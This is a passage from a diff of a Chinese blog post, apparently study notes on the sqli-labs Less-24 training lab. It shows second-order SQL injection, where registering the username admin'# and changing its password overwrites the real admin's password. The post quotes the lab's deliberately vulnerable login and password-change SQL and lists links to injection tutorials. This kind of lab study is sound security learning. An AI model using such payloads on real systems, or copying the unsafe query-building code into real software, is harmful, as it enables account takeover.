+<p><img src="https://i.loli.net/2021/06/23/ns9UdP3KVTqYG7g.png" alt="img"></p>
+<h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>登录界面并不存在注入，先注册一个账号<code>root&#39;#</code>密码为<code>root</code></p>
+<p><img src="https://i.loli.net/2021/06/23/D6tzxS47IYdENX2.png" alt="image-20210623193305758"></p>
+<p>可见成功注册</p>
+<p>login.php</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function sqllogin()&#123;</span><br><span class="line"></span><br><span class="line">   $username <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_user&quot;]);</span><br><span class="line">   $password <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_password&quot;]);</span><br><span class="line">   $<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">   $res <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>) <span class="keyword">or</span> die(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   $<span class="type">row</span> <span class="operator">=</span> mysql_fetch_row($res);</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r($<span class="type">row</span>) ;</span><br><span class="line">   if ($row[1]) &#123;</span><br><span class="line">			<span class="keyword">return</span> $<span class="type">row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可见登录界面的<code>username</code>和<code>password</code>均被<code>mysql_real_escape_string</code>函数进行转义，但是由于转义后加上的反斜杠\并不会被写入数据库中，所以还是可以成功注册<code>root&#39;#</code>账号</p>
+<p>使用<code>root&#39;#</code>进行登录</p>
+<blockquote>
+<p>由于原本的数据库中不存在<code>root</code>的账号，所以注册<code>root&#39;#</code>没有用，还是对二次注入的理解不到位</p>
+</blockquote>
+<p>这里重新注册一个<code>admin&#39;#</code>的账号，进行登录，将<code>admin&#39;#</code>密码修改为<code>090909</code></p>
+<p><img src="https://i.loli.net/2021/06/23/91lu5brfLTc7KJV.png" alt="image-20210623195152806"></p>
+<p>结果发现反而是<code>admin</code>的密码被修改了，而<code>admin&#39;#</code>则没有被修改</p>
+<p>在<code>pass_change</code>中有这样的sql更新语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>
+<p>当使用<code>admin&#39;#</code>进行修改密码时，这里的<code>username=&#39;$username&#39;</code>就会变为<code>username=&#39;admin&#39;#&#39;</code>而<code>#</code>会将后面的单引号注释了，所以就直接变成了<code>admin</code>用户</p>
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235970#h3-2">SQL注入漏洞详解</a></p>
 <p><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/1638">【最全干货】SQL注入大合集</a></p>
-<p>其他：</p>
-<blockquote>
-<p>附上国光师傅的随笔</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/104309945">Sqli-labs 堆叠注入篇 (Less38~53)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0nth3way/articles/7128189.html">SQL注入-堆叠注入（堆查询注入）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/108654206">sqli-labs学习笔记（十一）less 32-37 宽字节注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/3fe7904683ac">SQL注入防御绕过——二次注入</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/10/todo.html">国光的安全随笔记录</a></p>
-</blockquote>
 
                 
             </div>
@@ -1030,7 +1119,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">5.7k</span>&nbsp;字
+                class="white-color">7.5k</span>&nbsp;字
             
             
             
